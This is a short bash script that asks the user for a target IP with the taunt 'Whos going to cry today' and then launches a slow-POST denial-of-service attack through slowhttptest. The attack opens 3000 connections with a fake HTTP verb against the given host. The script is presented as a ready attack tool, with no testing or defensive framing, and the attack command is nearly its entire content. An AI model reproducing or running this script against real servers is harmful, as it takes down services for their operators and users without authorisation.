#! /bin/bash

echo "###################### SLOW-POST ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "################# STARTING THREADS ######################"

slowhttptest -c 3000 -B -i 110 -r 200 -s 8192 -t FAKEVERB -u http://$tarip/ -x 10 -p 3
